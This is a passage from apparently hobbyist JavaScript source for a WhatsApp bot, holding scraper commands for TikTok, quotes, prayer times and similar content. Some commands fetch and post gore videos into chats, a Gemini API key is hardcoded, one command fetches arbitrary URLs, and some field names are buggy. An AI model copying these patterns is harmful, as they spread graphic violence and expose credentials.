						view: $(b).find('div.post-thumbnail > div.post-meta.bb-post-meta.post-meta-bg > span.post-meta-item.post-views').text(),
						vote: $(b).find('div.post-thumbnail > div.post-meta.bb-post-meta.post-meta-bg > span.post-meta-item.post-votes').text(),
						tag: $(b).find('div.content > header > div > div.bb-cat-links').text(),
						comment: $(b).find('div.content > header > div > div.post-meta.bb-post-meta > a').text()
					})
				})
				const random = link[Math.floor(Math.random() * link.length)]
				axios.get(random.link)
					.then((resu) => {
						const $$ = cheerio.load(resu.data)
						const hasel = {}
						hasel.title = random.title
						hasel.source = random.link
						hasel.thumb = random.thumb
						hasel.tag = $$('div.site-main > div > header > div > div > p').text()
						hasel.upload = $$('div.site-main').find('span.auth-posted-on > time:nth-child(2)').text()
						hasel.author = $$('div.site-main').find('span.auth-name.mf-hide > a').text()
						hasel.comment = random.comment
						hasel.vote = random.vote
						hasel.view = $$('div.site-main').find('span.post-meta-item.post-views.s-post-views.size-lg > span.count').text()
						hasel.video1 = $$('div.site-main').find('video > source').attr('src')
						hasel.video2 = $$('div.site-main').find('video > a').attr('href')
						resolve(hasel)
					})
			})
	})
}
let letme = await gore()
let hiy = `[ *RANDOM GORE* ]

Title: ${letme.title}
Source: ${letme.source}
Tag: ${letme.tag}
Upload: ${letme.upload}
Author: ${letme.author}
Comment: ${letme.comment}
Vote: ${letme.vote}
Views: ${letme.view}
`
await David.sendMessage(m.chat, { video: { url: letme.video1 }, caption: hiy }, { quoted: m })
}
break
        
        case 'tt3': {
  let input = `[!] *wrong input*
	
Ex : ${prefix + command} https://vt.tiktok.com/ZSFSqcuXb/`

    if (!text) return m.reply(input)
    
  if (!(text.includes('http://') || text.includes('https://'))) return m.reply(`url invalid, please input a valid url. Try with add http:// or https://`)
    if (!text.includes('tiktok.com')) return m.reply(`Invalid Tiktok URL.`)
async function tiktok(url) {
	return new Promise(async (resolve, reject) => {
		const msc = await axios({
			url: "https://musicaldown.com/id",
			method: "GET",
			headers: {
				'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
			}
		})
		const a = cheerio.load(msc.data)
		let FORM = {
			[`${a("#link_url").attr("name")}`]: url,
			[`${a("#submit-form > div").find("div:nth-child(1) > input[type=hidden]:nth-child(2)").attr("name")}`]: a("#submit-form > div").find("div:nth-child(1) > input[type=hidden]:nth-child(2)").attr("value"),
			verify: a("#submit-form > div").find("div:nth-child(1) > input[type=hidden]:nth-child(3)").attr("value")
		}
		const getPost = await axios({
			url: "https://musicaldown.com/id/download",
			method: "POST",
			headers: {
				'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
				"cookie": msc.headers["set-cookie"].join("")
			},
			data: new URLSearchParams(Object.entries(FORM))
		})

		const postmp3 = await axios({
			url: "https://musicaldown.com/id/mp3",
			method: "POST",
			headers: {
				'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
				"cookie": msc.headers["set-cookie"].join("")
			},
			data: new URLSearchParams(Object.entries(getPost))
		})

		const w = cheerio.load(getPost.data)
		const x = cheerio.load(postmp3.data)
		const FormatPost = {
			nowm: w("body > div.welcome.section > div").find("div.col.s12.l8 > a").eq(2).attr("href"),
			audio: x("a.btn.waves-effect.waves-light.orange").eq(2).attr("href")
		}
		return resolve(FormatPost)
	})
}
let tiktik = await tiktok(text)
await David.sendMessage(m.chat, { video: { url: tiktik.nowm }, caption: mess.success }, { quoted: m })
await David.sendMessage(m.chat, { audio: { url: tiktik.audio }, mimetype: "audio/mp4", ptt: true }, { quoted: m })
}
break
        
        case 'aio2': {
  if (!text) return reply(`Example: ${prefix + command} link`)
async function aio(url){
	return new Promise(async(resolve,reject) => {
		
 const { data: rest } = await axios.get("https://steptodown.com/")
    const $ = cheerio.load(rest) 
    const tokens = $("input[name='token']").val()
    const data = new URLSearchParams(
      Object.entries({
        url: url,
        token: tokens 
      })
    )    
    await axios.post("https://steptodown.com/wp-json/aio-dl/video-data/", data, {
      headers: {
        "cookie": "PHPSESSID=658754a80bacc095aced0be8e110f3b4; pll_language=en",
        "user-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
      }
    })
    .then(( response ) => {
      resolve(response.data)
    })
    .catch((e) => {
      reject(e)
    })
  })
}
let sonice = await aio(text)
let wpol = `[ *AIO DOWNLOADER* ]

${sonice.title}

Duration: ${sonice.duration}
Source: ${sonice.source}
Size: ${sonice.medias[0].formattedSize} || ${sonice.medias[0].size}
Quality: ${sonice.medias[0].quality}
MimeType: ${sonice.medias[0].extension}
`
await David.sendMessage(m.chat, { video: { url: sonice.medias[0].url }, caption: wpol }, { quoted: m })
}
break
case 'quotess':{
//wm senn
async function quotes(input) {
	return new Promise((resolve, reject) => {
		fetch('https://jagokata.com/kata-bijak/kata-' + input.replace(/\s/g, '_') + '.html?page=1')
			.then(res => res.text())
			.then(res => {
				const $ = cheerio.load(res)
				data = []
				$('div[id="main"]').find('ul[id="citatenrijen"] > li').each(function (index, element) {
					x = $(this).find('div[class="citatenlijst-auteur"] > a').text().trim()
					y = $(this).find('span[class="auteur-beschrijving"]').text().trim()
					z = $(element).find('q[class="fbquote"]').text().trim()
//wm senn
					data.push({ author: x, bio: y, quote: z })
				})
				data.splice(2, 1)
//wm senn
				if (data.length == 0) return resolve({ creator: '@neoxr - Wildan Izzudin & @ariffb.id - Ariffb', status: false })
				resolve({ creator: '@neoxr - Wildan Izzudin & @ariffb.id - Ariffb', status: true, data })
			}).catch(reject)
	})
}
//wm senn
if (!text) return m.reply("Enter Quotes Type\n\nExample: .quotes senja")
//wm senn
let ayam = await quotes(text)
//wm senn
let jawir = ayam.data
let ngawi = pickRandom(jawir)
//wm senn
let cap = `  
_${ngawi.quote}_

~ ${ngawi.author}
`.trim()
//wm senn
m.reply(cap)
}
break
case 'quotesanime': {
async function quotesAnime() {
    try {
        const page = Math.floor(Math.random() * 184);
        const { data } = await axios.get('https://otakotaku.com/quote/feed/' + page);
        const $ = cheerio.load(data);
        const hasil = [];
        $('div.kotodama-list').each((l, h) => {
            hasil.push({
                link: $(h).find('a').attr('href'),
                gambar: $(h).find('img').attr('data-src'),
                karakter: $(h).find('div.char-name').text().trim(),
                anime: $(h).find('div.anime-title').text().trim(),
                episode: $(h).find('div.meta').text(),
                up_at: $(h).find('small.meta').text(),
                quotes: $(h).find('div.quote').text().trim()
            });
        });
        return hasil;
    } catch (error) {
        throw error;
    }
}
quotesAnime().then(hasil => {
 if (hasil.length === 0) {
 m.reply('Tidak ada hasil yang ditemukan.');
 return;
 }
 
 let replyTextt = `[ *QUOTES_ANIME* ]\n\n`;
 hasil.forEach((hasil) => {
 replyTextt += `Quotes: ${hasil.quotes}\nAnime: ${hasil.anime}\nEpisode: ${hasil.episode}\nUp: ${hasil.up_at}\nCharacter: ${hasil.karakter}\nLink${hasil.link}\n\n`;
 });
 
 m.reply(replyTextt);
 }).catch(error => {
 m.reply('Terjadi kesalahan saat merandom di QuotesAnime.');
 m.reply(error.message);
 })
}
break
case 'tt2': {
  let input = `[!] *wrong input*
	
Ex : ${prefix + command} https://vt.tiktok.com/ZSFSqcuXb/`

    if (!text) return m.reply(input)
    
  if (!(text.includes('http://') || text.includes('https://'))) return m.reply(`url invalid, please input a valid url. Try with add http:// or https://`)
    if (!text.includes('tiktok.com')) return m.reply(`Invalid Tiktok URL.`)
async function tiktokDl(url) {
	return new Promise(async (resolve, reject) => {
		try {
			let data = []
			function formatNumber(integer) {
				let numb = parseInt(integer)
				return Number(numb).toLocaleString().replace(/,/g, '.')
			}
			
			function formatDate(n, locale = 'en') {
				let d = new Date(n)
				return d.toLocaleDateString(locale, {
					weekday: 'long',
					day: 'numeric',
					month: 'long',
					year: 'numeric',
					hour: 'numeric',
					minute: 'numeric',
					second: 'numeric'
				})
			}
			
			let domain = 'https://www.tikwm.com/api/';
			let res = await (await axios.post(domain, {}, {
				headers: {
					'Accept': 'application/json, text/javascript, */*; q=0.01',
					'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'Origin': 'https://www.tikwm.com',
					'Referer': 'https://www.tikwm.com/',
					'Sec-Ch-Ua': '"Not)A;Brand" ;v="24" , "Chromium" ;v="116"',
					'Sec-Ch-Ua-Mobile': '?1',
					'Sec-Ch-Ua-Platform': 'Android',
					'Sec-Fetch-Dest': 'empty',
					'Sec-Fetch-Mode': 'cors',
					'Sec-Fetch-Site': 'same-origin',
					'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
					'X-Requested-With': 'XMLHttpRequest'
				},
				params: {
					url: url,
					count: 12,
					cursor: 0,
					web: 1,
					hd: 1
				}
			})).data.data
			if (res && !res.size && !res.wm_size && !res.hd_size) {
				res.images.map(v => {
					data.push({ type: 'photo', url: v })
				})
			} else {
				if (res && res.wmplay) {
					data.push({ type: 'watermark', url: 'https://www.tikwm.com' + res.wmplay })
				}
				if (res && res.play) {
					data.push({ type: 'nowatermark', url: 'https://www.tikwm.com' + res.play })
				}
				if (res && res.hdplay) {
					data.push({ type: 'nowatermark_hd', url: 'https://www.tikwm.com' + res.hdplay })
				}
			}
			let json = {
				status: true,
				title: res.title,
				taken_at: formatDate(res.create_time).replace('1970', ''),
				region: res.region,
				id: res.id,
				durations: res.duration,
				duration: res.duration + ' Seconds',
				cover: 'https://www.tikwm.com' + res.cover,
				size_wm: res.wm_size,
				size_nowm: res.size,
				size_nowm_hd: res.hd_size,
				data: data,
				music_info: {
					id: res.music_info.id,
					title: res.music_info.title,
					author: res.music_info.author,
					album: res.music_info.album ? res.music_info.album : null,
					url: 'https://www.tikwm.com' + res.music || res.music_info.play
				},
				stats: {
					views: formatNumber(res.play_count),
					likes: formatNumber(res.digg_count),
					comment: formatNumber(res.comment_count),
					share: formatNumber(res.share_count),
					download: formatNumber(res.download_count)
				},
				author: {
					id: res.author.id,
					fullname: res.author.unique_id,
					nickname: res.author.nickname,
					avatar: 'https://www.tikwm.com' + res.author.avatar
				}
			}
			resolve(json)
		} catch (e) {
			reject(e)
		}
	});
}
let down = await tiktokDl(text)
let berak = `[ *TIKTOK DOWNLOADER* ]

Videos:
Title: ${down.title}
Server: ${down.region}
ID: ${down.id}
Durasi: ${down.duration}
Size: ${down.size_nowm_hd}

Music Info:
ID: ${down.music_info.id}
Title: ${down.music_info.title}
Pemilik Musik: ${down.music_info.author}

Stats: 
Views: ${down.stats.views}
Likes: ${down.stats.likes}
Comment: ${down.stats.comment}
Share: ${down.stats.share}
Download: ${down.stats.download}

Author: 
ID: ${down.author.id}
Full Name: ${down.author.fullname}
Nickname: ${down.author.nickname}
Avatar: ${down.author.avatar}
`
await David.sendMessage(m.chat, { video: { url: down.data[2].url }, caption: berak }, { quoted: m })
await David.sendMessage(m.chat, { audio: { url: down.music_info.url }, mimetype: "audio/mp4", ptt: true }, { quoted: m })
}
break

case 'cinema': {
async function cinema() {

  try {

    const response = await axios.get('https://21cineplex.com/')

    const html = response.data

    const $ = cheerio.load(html)

    const results = []

    $('.col-3 .movie').each((index, element) => {

      const movieTitle = $(element).find('.movie-desc h4').text().trim()

      const movieLabel = $(element).find('.movie-desc span.movie-label img').attr('src')

      const moviePoster = $(element).find('.movie-poster img').attr('src')

      const movieLink = $(element).find('a').attr('href')

      const data = {

        title: movieTitle,

        label: movieLabel,

        poster: moviePoster,

        link: movieLink

      }

      results.push(data)

    })

    return results

  } catch (error) {

    console.error(error)

  }

}
cinema().then(results => {
 if (results.length === 0) {
 m.reply('No results found.');
 return;
 }
 
 let replyTextt = `[ *CINEMA RANDOM* ]\n\n`;
 results.forEach((results) => {
 replyTextt += `Title: ${results.title}\nPoster: ${results.poster}\nLink: ${results.link}\n\n`;
 });
 
 m.reply(replyTextt);
 }).catch(error => {
 m.reply('An error occurred while randomizing in cinema.');
 m.reply(error.message);
 });
}
break




case 'cerpen': {
  if (!text) return reply(`Example: ${prefix + command} child`)
async function cerpen(category) {
    return new Promise((resolve, reject) => {
        let title = category.toLowerCase().replace(/[()*]/g, "")
        let judul = title.replace(/\s/g, "-")
        let page = Math.floor(Math.random() * 5)
        axios.get('http://cerpenmu.com/category/cerpen-'+judul+'/page/'+page)
        .then((get) => {
            let $ = cheerio.load(get.data)
            let link = []
            $('article.post').each(function (a, b) {
                link.push($(b).find('a').attr('href'))
            })
            let random = link[Math.floor(Math.random() * link.length)]
            axios.get(random)
            .then((res) => {
                let $$ = cheerio.load(res.data)
                let hasil = {
                    title: $$('#content > article > h1').text(),
                    author: $$('#content > article').text().split('Cerpen Karangan: ')[1].split('Category: ')[0],
                    Category: $$('#content > article').text().split('Category: ')[1].split('\n')[0],
                    lolos: $$('#content > article').text().split('Lolos moderasi pada: ')[1].split('\n')[0],
                    cerita: $$('#content > article > p').text()
                }
                resolve(hasil)
            })
        })
    })
}
let cepren = await cerpen(text)
let cepen = `Title: ${cepren.title}\nAuthor: ${cepren.author}\nCategory: ${cepren.kategori}\nLolos: ${cepren.lolos}\nCerita: ${cepren.cerita}`
await m.reply(cepen)
}
break
case 'fdroid': {
  if (!q) return reply(`Example: ${prefix + command}`)
 async function avzxxx(query) {
    const url = `https://search.f-droid.org/?q=${encodeURIComponent(query)}&lang=id`;

    try {
        const { data } = await axios.get(url);
        const $ = cheerio.load(data);
        const apps = [];
        $('.package-header').each((index, element) => {
            const title = $(element).find('.package-name').text().trim();
            const apkUrl = $(element).attr('href');
            const LinkGambar = $(element).find('.package-icon').attr('src');

            apps.push({ title, apkUrl, LinkGambar });
        });

        return apps;

    } catch (error) {
        console.error('Error:', error);
    }
}
avzxxx(q).then(apps => {
 if (apps.length === 0) {
 m.reply('No results found.');
 return;
 }
 
 let replyTextt = `Search results for "${q}":\n\n`;
 apps.forEach((apps) => {
 replyTextt += `Title: ${apps.title}\nApk Url: ${apps.apkUrl}\nLink Gambar: ${apps.LinkGambar}\n\n`;
 });
 
 m.reply(replyTextt);
 }).catch(error => {
 m.reply('Terjadi kesalahan saat pencrian di fdroid.');
 m.reply(error.message);
 });
}
break
case 'style': case 'styletext': {
    async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
if (!text) return m.reply('Enter Query text!')
let anu = await styletext(text)
let teks = `Style Text From ${text}\n\n`
 for (let i of anu) {
teks += `🍀 *${i.name}* : ${i.result}\n\n`
   }
m.reply(teks)
 }
break
case 'get': {
		if (typeof text !== 'string' || !text.trim()) {
			return m.reply(`Add Input (Link)\n\nExample: ${prefix + command} https://example.com`);
		}
		const isUrl = (url) => {
			return url.match(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/gi);
		};
		const urlMatch = isUrl(text);
		if (!urlMatch) {
			return m.reply(`Invalid URL provided. Please provide a valid URL.\n\nExample: ${prefix + command} https://example.com`);
		}
		const url = urlMatch[0]; // Use the first match
		try {
			const res = await axios.get(url);
			if (!/json|html|plain/.test(res.headers['content-type'])) {
				return m.reply(`The content type of the provided URL is not supported.\n\nSupported types: json, html, plain text.`);
			}
			m.reply(util.format(res.data));
		} catch (e) {
			m.reply(`Error fetching data from the provided URL: ${util.format(e.message)}`);
		}
}
break

case 'trackip':
{
if (!text) return m.reply(`*Example:* ${prefix + command} 112.90.150.204`);
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};
 
if (!res.success) throw new Error(`IP ${text} not found!`);
await David.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
m.reply(formatIPInfo(res)); 
} catch (e) { 
m.reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
break
case 'filmsearch': {
    if (!text) return reply('Masukan query')

    m.reply(mess.wait)
    
    async function film(query) {
    return new Promise((resolve, reject) => {
      const https = require('https')
        const url = `https://ruangmoviez.my.id/?s=${query}`
        
        https.get(url, (resp) => {
            let data = ''
            
            resp.on('data', (chunk) => {
                data += chunk
            })
            
            resp.on('end', () => {
                let $ = cheerio.load(data)
                const movies = []

                $('article.item-infinite').each((index, element) => {
                    const movie = {}
                    movie.link = $(element).find('a[itemprop="url"]').attr('href')
                    movie.title = $(element).find('h2.entry-title a').text()
                    movie.relTag = $(element).find('a[rel="category tag"]').map((i, el) => $(el).text()).get()
                    movies.push(movie)
                })

                resolve({
                    status: 200,
                    creator: author,
                    result: movies
                })
            })
        }).on("error", (err) => {
            resolve({
                status: 404,
                msg: err.message
            })
        })
    })
}
    
    let { result } = await film(text)
    let cap = `\`Search Film From: ${text}\`\n\n`
    for (let res of result) {
        cap += `*Title*: ${res.title}\n`
        cap += `*Link*: ${res.link}\n`
        cap += `*Genre*: ${res.relTag.map(v => v).join(', ')}\n\n`
    }
    m.reply(cap)
}
break
case 'goredl': {
  if (!text) return reply(`Example: ${prefix + command} seegore`)
async function sgoredl(link) {
	return new Promise(async (resolve, reject) => {
		axios.get(link)
			.then(({
				data
			}) => {
				const $$ = cheerio.load(data)
				const format = {
					Title: $$('div.single-main-container > div > div.bb-col.col-content > div > div > div > div > header > h1').text(),
					views: $$('div.single-main-container > div > div.bb-col.col-content > div > div > div > div > div.s-post-meta-block.bb-mb-el > div > div > div.col-r.d-table-cell.col-md-6.col-sm-6.text-right-sm > div > span > span.count').text(),
					comment: $$('div.single-main-container > div > div.bb-col.col-content > div > div > div > div > div.s-post-meta-block.bb-mb-el > div > div > div.col-r.d-table-cell.col-md-6.col-sm-6.text-right-sm > div > a > span.count').text(),
					link: $$('video > source').attr('src')
				}
				const result = {
					creator: "Wudysoft",
					data: format
				}
				resolve(result)
			})
			.catch(reject)
	})
}
const gkanjut = await sgoredl(text)
let pant = gkanjut.data
let ghann = `[ *SEEGORE DOWNOADER* ]

Title: ${pant.judul}
Views: ${pant.views}
Comment: ${pant.comment}
Link: ${pant.link}
`
David.sendMessage(m.chat, {video: {url: pant.link}, caption: ghann}, {quoted: metaai})
}
break
case 'goresearch': {
  if (!text) return reply("Example: .goresearch girl")
async function ssearchgore(query) {
	return new Promise(async (resolve, reject) => {
		axios.get('https://seegore.com/?s=' + query).then(dataa => {
			const $$$ = cheerio.load(dataa)
			let pagina = $$$('#main > div.container.main-container > div > div.bb-col.col-content > div > div > div > div > nav > ul > li:nth-child(4) > a').text();
			let slink = 'https://seegore.com/?s=' + query
			axios.get(slink)
				.then(({
					data
				}) => {
					const $ = cheerio.load(data)
					const link = [];
					const judul = [];
					const uploader = [];
					const format = [];
					const thumb = [];
					$('#post-items > li > article > div.content > header > h2 > a').each(function(a, b) {
						link.push($(b).attr('href'))
					})
					$('#post-items > li > article > div.content > header > h2 > a').each(function(c, d) {
						let jud = $(d).text();
						judul.push(jud)
					})
					$('#post-items > li > article > div.content > header > div > div.bb-cat-links > a').each(function(e, f) {
						let upl = $(f).text();
						uploader.push(upl)
					})
					$('#post-items > li > article > div.post-thumbnail > a > div > img').each(function(g, h) {
						thumb.push($(h).attr('src'))
					})
					for (let i = 0; i < link.length; i++) {
						format.push({
							Title: judul[i],
							uploader: uploader[i],
							thumb: thumb[i],
							link: link[i]
						})
					}
					const result = {
						creator: "Wudysoft",
						data: format
					}
					resolve(result)
				})
				.catch(reject)
		})
	})
}
try {
let haiyak = await ssearchgore(text)
let coba = haiyak.data
let goreng;
for (let i of coba) {
   goreng = `Title: ${i.judul}\nUploader: ${i.uploader}\nLink: ${i.link}\n\n`
}
m.reply(goreng)
} catch (e) {
m.reply(e)
}
}
break

case 'jadwalsholat': { 
  if (!text) return reply(`Example: .jakarta prayer schedule`)
async function jadwalSholat(query) {
  return new Promise((resolve, reject) => {
    axios
      .get(`https://umrotix.com/jadwal-sholat/${query}`)
      .then(({ data }) => {
        const $ = cheerio.load(data);
        $(
          "body > div > div.main-wrapper.scrollspy-action > div:nth-child(3) ",
        ).each(function (a, b) {
          result = {
            tanggal: $(b).find("> div:nth-child(2)").text(),
            imsak: $(b)
              .find(
                "> div.panel.daily > div > div > div > div > div:nth-child(1) > p:nth-child(2)",
              )
              .text(),
            subuh: $(b)
              .find(
                "> div.panel.daily > div > div > div > div > div:nth-child(2) > p:nth-child(2)",
              )
              .text(),
            dzuhur: $(b)
              .find(
                "> div.panel.daily > div > div > div > div > div:nth-child(3) > p:nth-child(2)",
              )
              .text(),
            ashar: $(b)
              .find(
                "> div.panel.daily > div > div > div > div > div:nth-child(4) > p:nth-child(2)",
              )
              .text(),
            maghrib: $(b)
              .find(
                "> div.panel.daily > div > div > div > div > div:nth-child(5) > p:nth-child(2)",
              )
              .text(),
            isyak: $(b)
              .find(
                "> div.panel.daily > div > div > div > div > div:nth-child(6) > p:nth-child(2)",
              )
              .text(),
          };
          resolve(result);
        });
      })
      .catch(reject);
  });
}
let sholatt = await jadwalSholat(text)
m.reply(`
[ *PRAYER SCHEDULE* ]

5 Times from Region ${text}

Tanggal: ${sholatt.tanggal}
Imsak: ${sholatt.imsak}
Shubuh: ${sholatt.subuh}
Dzuhur: ${sholatt.dzuhur}
Ashar: ${sholatt.ashar}
Maghrib: ${sholatt.maghrib}
Isya: ${sholatt.isyak}
`)
}
break
case 'kurumi': {
//wm hann
  if (!text) return m.reply(`Hi, how are you today??`)
async function generateVoice(Query) {
    const formData = new FormData();
    formData.append("locale", 'id-ID');
    formData.append("content", `<voice name="ja-JP-AoiNeural">${Query}</voice>`);
    formData.append("ip", '46.161.194.33');
    const response = await fetch('https://app.micmonster.com/restapi/create', {
        method: 'POST',
        body: formData
    });
    return Buffer.from(('data:audio/mpeg;base64,' + await response.text()).split(',')[1], 'base64');
};
//wm hann
const sendToGemini = async (prompt) => {
    const apiKey = 'AIzaSyB2mvsGVTZAU-h-GtCLzoLhjHEdvugx9uQ'; // Dapatkan apikey dari  https://aistudio.google.com/app/apikey
    const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash-latest:generateContent?key=${apiKey}`;
    //wm hann
    const body = {
        contents: [
            {
                parts: [
                    { text: prompt }
                ]
            }
        ]
    };
//wm hann
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(body)
        });

        const data = await response.json();

        if (response.ok) {
            return data; 
        } else {
            throw new Error(data.error.message || 'Request failed');
        }
    } catch (error) {
        console.error('Error:', error.message);
        return null;
    }
};
//wm hann
const prompt = `Your name is I am Rumi, you are a virtual assistant developed directly from Google.`;
    const combinedPrompt = `${prompt} ${text}`;
//wm hann
    try {
        // Mengirim prompt ke API Gemini
        const response = await sendToGemini(combinedPrompt);
//wm hann
        if (response) {
//wm hann
            const candidates = response.candidates;
            let message = candidates && candidates.length > 0
                ? candidates[0].content.parts[0].text
                : 'No response received from model.';
            //wm hann
            // Mengganti ** dengan * dan mengedit jawaban jika perlu
            messagee = message.replace(/\*\*/g, '*').replace(/#{2,}/g, '#');
        } else {
//wm hann
            David.sendMessage(
                m.chat,
                { text: 'Gagal mendapatkan respons dari Gemini.' },
                { quoted: m }
            );
        }
    } catch (error) {
        console.error(error);
//wm hann
        David.sendMessage(
            m.chat,
            { text: 'An error occurred while processing your request.' },
            { quoted: m }
        );
    }
//wm hann
    try {
//wm hann
        let res = await generateVoice(messagee)
await m.reply(messagee)
        if (res) await David.sendMessage(m.chat, {
        audio: res,
        mimetype: 'audio/mp4',
        ptt: true,
        waveform: [100, 0, 100, 0, 100, 0, 100]
    }, {
        quoted: m
    })
    } catch (e) {
        await m.reply(e)
    }
//wm hann
}
break
case 'tr': {
  if (!m.quoted.text) return reply(`reply to be translated`)
async function translate(query = "", lang) {
	if (!query.trim()) return "";
	const url = new URL("https://translate.googleapis.com/translate_a/single");
	url.searchParams.append("client", "gtx");
	url.searchParams.append("sl", "auto");
	url.searchParams.append("dt", "t");
	url.searchParams.append("tl", lang);
	url.searchParams.append("q", query);

	try {
		const response = await fetch(url.href);
		const data = await response.json();
		if (data) {
			return [data[0].map((item) => item[0].trim()).join("\n"), data[2]];
		} else {
			return "";
		}
	} catch (err) {
		throw err;
	}
}

let banjir = await translate(m.quoted.text, "id")
m.reply(`${banjir[0]}, ${banjir[1]}`)
}
break
case 'txt2img': {
if (!text) return m.reply(`Example: ${prefix + command} cat`)
async function photoleap(prompt) {
    try {
        let result = []
        for (let i = 0; i < 3; i++) {
            let {
                data
            } = await axios.get('https://tti.photoleapapp.com/api/v1/generate?prompt=' + prompt);
            result.push(data.result_url)
        }
        return result
    } catch (e) {
        return ({
            msg: 404
        })
    }
}

let tahu = await photoleap(text)
for (const x of tahu) {
David.sendMessage(m.chat, {image: {url: x}, caption: `Done`}, {quoted: m})
}
}
break

 


case 'creategc':
case 'creategroup': {
if (!isCreator) return reply('`For My Owner Only`')
if (!args.join(" ")) return reply(`Use .creategc groupname`)
try {
let cret = await David.groupCreate(args.join(" "), [])
let response = await Fernazerini.groupInviteCode(cret.id)
let teks2 = `      [ ${cret.subject} ]

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}
▸ Group Id : ${cret.id}
▸ Join : chat.whatsapp.com/${response}`
reply(teks2)
} catch {
reply("Success")
}
}
break


case 'tiktoksearch':
case 'ttsearch': {
    const dann = require('d-scrape')
if (!text) return reply(`Example : ${prefix + command} jj epep`)
reply('Being processed ⏳')
try {
let anu = await dann.search.tiktoks(text)
David.sendMessage(m.chat, { video: { url: anu.no_watermark }, mimetype: 'video/mp4', caption: anu.title }, { quoted : m })
} catch (error) {
reply('Error')
}
}
break
        
case 'surah': {
  if (!q) return reply(`Example ${prefix+command} 113`)
async function surah(no){
	return new Promise(async(resolve, reject) => {
		axios.get('https://kalam.sindonews.com/surah/' + no)
		.then(({ data }) => {
			const $ = cheerio.load(data)
			const result = [];
			const ar = [];
			const id = [];
			const lt = [];
			const au = [];
			$('div.breadcrumb-new > ul > li:nth-child(5)').each(function(c,d) {
			result.audio = $(d).find('a').attr('href').replace('surah','audioframe')
			})
			$('div.ayat-arab').each(function(a, b) {
				ar.push($(b).text()) 
			})
			$('li > div.ayat-text').each(function(e, f) {
				id.push($(f).text().replace(',','').trim()) })
			$('div.ayat-latin').each(function(g, h) {
				lt.push($(h).text().trim())	})
			for(let i = 0; i < ar.length ; i++){
			result.push({
				arab: ar[i],
				indo: id[i],
				latin: lt[i],
			})
		}
			resolve(result)
		})
		.catch(reject)
	})
}
surah(q).then(result => {
 if (result.length === 0) {
 m.reply('No results found.');
 return;
 }
 
 let replyTexttt = `Results from Surah for "${q}":\n\n`;
 result.forEach((result, index) => {
 replyTexttt += `${result.indo}\n${result.arab}\n${result.latin}\n\n`;
 });
 
 m.reply(replyTexttt);
 }).catch(error => {
 m.reply('An error occurred while entering numbers in the surah.');
 console.error(error);
 });
}
break

 case 'antilink-kick': {
  if (!m.isGroup) return reply('ɢʀᴏᴜᴘ ᴏɴʟʏ');
    if (!isBotAdmins) return reply('ʙᴏᴛ ɴᴏᴛ ʏᴇᴛ ᴀᴅᴍɪɴ');
    if (!isAdmins) return reply('ғᴏʀ ɢʀᴏᴜᴘ ᴀᴅᴍɪɴ ᴏɴʟʏ');
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.antilinkkick = true
await reply('SucessFully Activated Antilink-kick')
} else if (args[0] === 'off') {
